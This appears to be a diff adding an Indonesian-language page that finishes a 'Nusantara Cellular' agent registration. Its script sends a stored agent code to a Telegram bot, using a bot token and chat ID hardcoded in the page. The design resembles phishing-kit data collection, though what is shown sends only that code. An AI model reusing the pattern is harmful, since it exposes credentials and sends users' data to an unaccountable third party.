@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Kode Agen Anda</title>
+    <style>
+      /* Style dasar untuk merapikan layout */
+      body {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #f5f5f5;
+        padding: 10px;
+        top: 0;
+      }
+
+      /* Style untuk logo */
+      .logo {
+        max-width: 100px;
+        margin-bottom: 20px;
+        top: -10px;
+        border-radius: 15px;
+      }
+
+      /* Style untuk judul utama di luar container */
+      .welcome-message {
+        font-size: 1.2rem;
+        text-align: center;
+        color: #333;
+        margin-bottom: 20px;
+      }
+
+      /* Style untuk container */
+      .container {
+        width: 90%;
+        max-width: 400px;
+        padding: 20px;
+        background-color: #fff;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        text-align: center;
+      }
+
+      /* Style untuk judul dalam container */
+      h2 {
+        font-size: 1.5rem;
+        margin-bottom: 20px;
+      }
+
+      /* Style untuk kode agen */
+      .kode-agen {
+        font-size: 2rem;
+        color: #333;
+        font-weight: bold;
+        margin-top: 20px;
+      }
+
+      /* Style untuk paragraf */
+      p {
+        font-size: 1rem;
+        color: #666;
+      }
+
+      /* Style untuk tombol kirim */
+      .btn-send {
+        margin-top: 20px;
+        padding: 10px 20px;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 1rem;
+        cursor: pointer;
+        background-color: #f7be0d;
+        transition: background-color 0.3s;
+      }
+
+      .btn-send:hover {
+        background-color: #e0a900;
+      }
+
+      /* Style untuk notifikasi */
+      .notification {
+        margin-top: 20px;
+        font-size: 1rem;
+        color: green;
+        display: none;
+      }
+
+      /* Responsive untuk layar kecil */
+      @media (max-width: 600px) {
+        .kode-agen {
+          font-size: 1.5rem;
+        }
+
+        .btn-send {
+          width: 100%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <img src="logo-pm.jpeg" alt="logo-nc" class="logo" />
+    <h2 class="welcome-message">
+      Jangan Lupa Tekan Kirim Kode Agen untuk menyelesaikan Pendaftaran Anda
+    </h2>
+    <div class="container">
+      <h2>Kode Agen Anda</h2>
+      <p>
+        Terima kasih telah mendaftar sebagai agen Nusantara Cellular. Berikut
+        adalah kode agen Anda:
+      </p>
+      <div id="kodeAgen" class="kode-agen"></div>
+      <button class="btn-send" onclick="kirimKeBot()">
+        Kirim Kode Agen Anda
+      </button>
+      <p id="notification" class="notification"></p>
+    </div>
+
+    <script>
+      const kodeAgen = localStorage.getItem("kodeAgen");
+      document.getElementById("kodeAgen").innerText = kodeAgen
+        ? kodeAgen
+        : "Tidak ada kode agen ditemukan.";
+
+      function kirimKeBot() {
+        const token = "7503697028:AAFrTt-8GILJRIyMTCY5C_EjuJPs1E5s7yY"; // Ganti dengan token bot Telegram Anda
+        const chat_id = "6424567671"; // Ganti dengan ID chat Anda
+        const pesan = `Kode Agen Anda: ${kodeAgen}`;
+        const notification = document.getElementById("notification");
+        const button = document.querySelector(".btn-send");
+
+        // Nonaktifkan tombol agar tidak bisa diklik lagi
+        button.disabled = true;
+        button.style.cursor = "not-allowed";
+        button.style.backgroundColor = "#ccc"; // Ubah warna tombol saat dinonaktifkan
+
+        fetch(
+          `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
+            pesan
+          )}`
+        )
+          .then((response) => {
+            if (response.ok) {
+              notification.innerText =
+                "Selamat! Kode agen Anda telah dikirim. Setelah proses verifikasi selesai, Anda akan dihubungi oleh admin kami.";
+              notification.style.display = "block";
+            } else {
+              notification.innerText = "Gagal mengirim ke bot Telegram.";
+              notification.style.display = "block";
+            }
+          })
+          .catch((error) => {
+            notification.innerText = "Terjadi kesalahan: " + error.message;
+            notification.style.display = "block";
+          });
+      }
+    </script>
+  </body>
+</html>
